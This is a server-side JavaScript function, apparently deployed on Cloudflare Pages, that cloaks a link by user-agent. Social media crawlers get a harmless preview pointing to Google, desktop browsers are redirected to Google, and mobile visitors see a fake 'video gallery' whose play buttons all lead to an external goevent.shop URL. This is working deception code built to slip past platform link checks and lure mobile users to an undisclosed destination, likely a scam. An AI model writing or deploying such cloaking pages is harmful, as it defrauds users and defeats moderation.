
export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get("user-agent") || "";

  // 1. Social media bots: Open Graph preview
  const isSocialBot =
    /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <meta property="og:title" content="Love & War">
  <meta property="og:description" content="">
  <meta property="og:image" content="https://www.google.com/share.google?q=1FaEVErLmLH5xEYd6">
  <meta property="og:url" content="https://www.google.com/">
  <meta property="og:type" content="website">
</head>
<body></body>
</html>`;

    return new Response(html, {
      headers: {
        "content-type": "text/html;charset=UTF-8",
        "cache-control": "no-store"
      }
    });
  }

  // 2. Desktop: Google 302 redirect
  const isMobile =
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (!isMobile) {
    return Response.redirect("https://www.google.com/", 302);
  }

  // 3. Mobile and other mobile devices: Gallery
  const gallery = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gallery</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 20px;
      background: #111;
      font-family: Arial, sans-serif;
    }
    .gallery-container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 16px;
      max-width: 1100px;
      margin: 0 auto;
    }
    .video-card {
      display: block;
      position: relative;
      overflow: hidden;
      border-radius: 10px;
      background: #222;
    }
    .video-thumbnail {
      display: block;
      width: 100%;
      height: 220px;
      object-fit: cover;
    }
    .play-overlay {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(0,0,0,.12);
    }
    .play-button {
      width: 58px;
      height: 58px;
      border-radius: 50%;
      background: rgba(0,0,0,.65);
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .play-icon {
      width: 0;
      height: 0;
      margin-left: 5px;
      border-top: 12px solid transparent;
      border-bottom: 12px solid transparent;
      border-left: 18px solid white;
    }
  </style>
</head>
<body>
  <div class="gallery-container">
    <a href="https://goevent.shop/news/0c8k " class="video-card">
      <img src="https://ghgj-dqx.pages.dev/577887f5354b81c4af9365ebb225ca04.gif"
           alt="Video 1" class="video-thumbnail">
      <div class="play-overlay"><div class="play-button"><div class="play-icon"></div></div></div>
    </a>

    <a href="https://goevent.shop/news/0c8k " class="video-card">
      <img src="https://fhhj-daw.pages.dev/8c2d78cd635d3a85f0162f3da7b13da2.gif"
           alt="Video 2" class="video-thumbnail">
      <div class="play-overlay"><div class="play-button"><div class="play-icon"></div></div></div>
    </a>

    <a href="https://goevent.shop/news/0c8k " class="video-card">
      <img src="https://jjhf-6gt.pages.dev/e1752b2e1d9e3ecfde2e99ca415e4696.gif"
           alt="Video 3" class="video-thumbnail">
      <div class="play-overlay"><div class="play-button"><div class="play-icon"></div></div></div>
    </a>
  </div>
</body>
</html>`;

  return new Response(gallery, {
    headers: {
      "content-type": "text/html;charset=UTF-8",
      "cache-control": "no-store"
    }
  });
}
